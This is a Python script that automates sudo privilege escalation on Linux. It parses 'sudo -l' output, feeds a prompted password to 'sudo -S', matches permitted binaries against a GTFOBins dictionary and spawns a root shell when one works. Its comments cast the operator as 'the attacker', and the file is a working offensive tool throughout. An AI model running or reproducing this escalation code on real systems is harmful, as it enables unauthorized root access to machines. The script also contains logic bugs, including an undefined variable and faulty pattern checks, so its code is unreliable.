#!/usr/bin/env python
try: 
	import subprocess as sub
	import os
	compatmode = 0  # newer version of python, no need for compatibility mode
except ImportError:
	import os  # older version of python, need to use os instead
	compatmode = 1
import time
import getpass 
from gtfObins import gtfobinsDict1


def execute_cmd(cmddict):

    for item in cmddict:
        cmd = cmddict[item]["cmd"]
        if compatmode == 0:  # newer version of python, use preferred subprocess
            out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
            results = out.split('\n')
        else:  # older version of python, use os.popen
            echo_stdout = os.popen(cmd, 'r')
            results = echo_stdout.read().split('\n')

        # write the results to the command Dictionary for each command run
        cmddict[item]["results"] = results

    return cmddict


def getUserName () : 
    return getpass.getuser ()


def ifUserhasPass () : 
    username = str(getUserName())
    try : 
        response = raw_input ("Do you have the password of the user  "+username+ "  [Y/N]? ")
        if response == 'yes' : 
            return True 
        else : 
            return False 
    except : 
        response =  input ("Do you have the password of the user  "+username+ "  [Y/N]? ")
        if response == 'yes' : 
            return True 
        else : 
            return False 


def getUserPass() : 
    pswd = getpass.getpass('Please enter your Password:')
    return pswd



def ifSudo_lreqPass () :
    binary = "echo invalid | sudo -S -l"
    out, err = sub.Popen(binary,shell =True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE).communicate ()
    if err : 
        return True
    else : 
        return False


def getcmdwithSudo() : 
    cmd  = {"SUDOERS": {"cmd": " sudo -l  2>/dev/null | sed -e '1,/peut utiliser les commandes/ d' 2>/dev/null ", "msg": "Display list of commands that actual user may run with sudo ", "results": []} }
    res = execute_cmd (cmd)
    sudoList = res['SUDOERS']['results']
    return sudoList

def getcmdwithSudoWithPass (passwd) : 
    cmd  = {"SUDOERS": {"cmd": 'echo "{passwd}" | sudo -S -l   2>/dev/null | sed -e  "1,/peut utiliser les commandes/ d" 2>/dev/null '.format(passwd=passwd), "msg": "Display list of commands that actual user may run with sudo ", "results": []} }
    res = execute_cmd (cmd)
    sudoList = res['SUDOERS']['results']
    return sudoList

def ifdefault (password, reqsudo_l) : 
    default = "(ALL : ALL) ALL"
    if reqsudo_l :
        sudoList = getcmdwithSudo () 
    elif not reqsudo_l :
        sudoList = getcmdwithSudoWithPass (password)
    print (sudoList)
    for i in sudoList : 
        if default in i  : 
            return True
        else :
            return False 


def getListofRootCmdwithPass (sudoList) : 
    pattern1 = "(ALL) PASSWD"
    pattern2 = "(root) PASSWD"
    PassSudoList = []
    for line in sudoList : 
        if  (pattern1 or pattern2)  in line :
            line = line.split(":")
            cmd = line[1]
            PassSudoList.append (cmd)
        else : 
            pass 
    return PassSudoList 

def getListofCmdwithRoot (sudoList) :
    pattern1 = "(ALL) NOPASSWD"
    pattern2 = "(root) NOPASSWD"
    noPassSudoList = []
    for line in sudoList : 
        if  (pattern1 or pattern2)  in line :
            line = line.split(":")
            cmd = line[1]
            noPassSudoList.append (cmd)
        else : 
            pass 
    return noPassSudoList


def matchSudobinaries (noPassSudoList) : 
    match_list = []
    gtfobinslist = list(gtfobinsDict1.keys())
    for element in noPassSudoList:
        element = element.rsplit('/',1)
        if element [1]  in gtfobinsDict1:
            match_list.append(element [1])
    return match_list




def checkIFSudoRootWithNoPass (binary) : 
    child = sub.Popen(binary,shell =True, stdin=sub.PIPE, stdout=sub.PIPE, stderr=sub.PIPE) 
    stdout, stderr =child.communicate(b'whoami')
    if stdout == b'root\n' : 
        return True 

    
def checkIFSudoRootWithPass (binary, passwd) :
    cmd_to_passwd= "echo '{passwd}' | sudo -S cat /etc/sudoers".format(passwd=passwd)
    print ("trying "+binary)
    child = sub.Popen(cmd_to_passwd,shell =True, stdin=sub.PIPE,   stdout=sub.PIPE, stderr=sub.PIPE)
    time.sleep (3)
    child1 = sub.Popen(binary,shell =True, stdin=sub.PIPE,   stdout=sub.PIPE, stderr=sub.PIPE)
    time.sleep (3)
    stdout, err = child1.communicate(b'whoami')
    if stdout == b'root\n' :
        print ("True") 
        return True 
    else :
        return False


def checkSudo_i (passwd) :
    cmd = 'echo "{passwd}" | sudo -S -i'.format(passwd=passwd)
    child = sub.Popen(cmd,shell =True, stdin=sub.PIPE,   stdout=sub.PIPE, stderr=sub.PIPE)
    stdout, stderr =child.communicate(b'whoami')
    if stdout == b'root\n' : 
        return True 
    else :
        return False 


def sudoprivescalation () :
    userPass = ifUserhasPass ()
    sudoPass = ifSudo_lreqPass ()

    # Check if the attecker has the password of the running user system 
    if userPass : 
        password = getUserPass ()

    
    #Cas 1
    if userPass : 
        if checkSudo_i (password) : 
            return  sub.Popen('echo "{passwd}" | sudo -S -i'.format(passwd=passwd),shell =True).wait() 
        else : 
            print ("Sudo -i not working ")


    if (userPass and sudoPass) :
        sudo_list_Pass = getListofRootCmdwithPass (getcmdwithSudoWithPass(password))      
        cmd_Pass = matchSudobinaries (sudo_list_Pass)
        cmd_no_pass = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudoWithPass(password)) )
       
        for cmd in cmd_no_pass : 
            try : 
                if checkIFSudoRootWithNoPass (gtfobinsDict1[cmd]) :
                    return sub.Popen(gtfobinsDict1[cmd],shell =True).wait() 
                else :
                    print ("seems like you are not running as root with "+cmd)
            except : 
                    print ("something went wrong while executing "+cmd)
         
        for cmd in cmd_Pass :
            try : 
                if checkIFSudoRootWithPass(gtfobinsDict1[cmd], password) : 
                    return sub.Popen(gtfobinsDict1[cmd],shell =True).wait() 
                else :
                    print ("seems like you can't run as root with "+cmd)
            except : 
                    print ("Somthin went wrong while executing "+cmd)

    # if the attacker has the password but sudo -l doesn't requires a passwd 
    #Cas 2.2
    if (userPass and not sudoPass) :
        sudo_list_Pass = getListofRootCmdwithPass(getcmdwithSudo())        
        cmd_Pass = matchSudobinaries (sudo_list_Pass)
        cmd_no_pass = matchSudobinaries (getListofCmdwithRoot(getcmdwithSudo()))

         
        for cmd in cmd_Pass :
            try : 
                if checkIFSudoRootWithPass(gtfobinsDict1[cmd], password) : 
                    return sub.Popen(gtfobinsDict1[cmd],shell =True).wait() 
                else :
                    print ("seems like you can't run as root with "+cmd)
            except :
                print ("Something went wrong while executing "+cmd)

        
        for cmd in cmd_no_pass : 
            try : 
                if checkIFSudoRootWithNoPass (gtfobinsDict1[cmd]) :
                    return sub.Popen(gtfobinsDict1[cmd],shell =True).wait() 
                else :
                    print ("seems like you are not running as root with "+cmd)
            except : 
                    print ("something went wrong while executing "+cmd)
            
       

    # if the attacker has no password but can execute sudo  -l 
    #Cas 2.3 
    if (not userPass and not sudoPass) : 
        binaries  = matchSudobinaries(getListofCmdwithRoot(getcmdwithSudo()))
        print (binaries)
        for binary in binaries : 
            try : 
                if  checkIFSudoRootWithNoPass (gtfobinsDict1[binary]) : 
                    return sub.Popen(gtfobinsDict1[binary],shell =True).wait() 
                else : 
                    print ("failed with binary "+binary) 
            except : 
                return "Something went wrong while executing command : "+ gtfobinsDict1[binary]

 
    if ifdefault (password, sudoPass) :
        print ('case 4')
        for key in gtfobinsDict1.keys():
            try : 
                if checkIFSudoRootWithPass(gtfobinsDict1[key], password) : 
                    return sub.Popen(gtfobinsDict1[key],shell =True).wait() 
                else :
                    print ("seems like you can't run as root with "+cmd)
            except : 
                    print ("Somthing went wrong while executing "+cmd)
    

sudoprivescalation ()
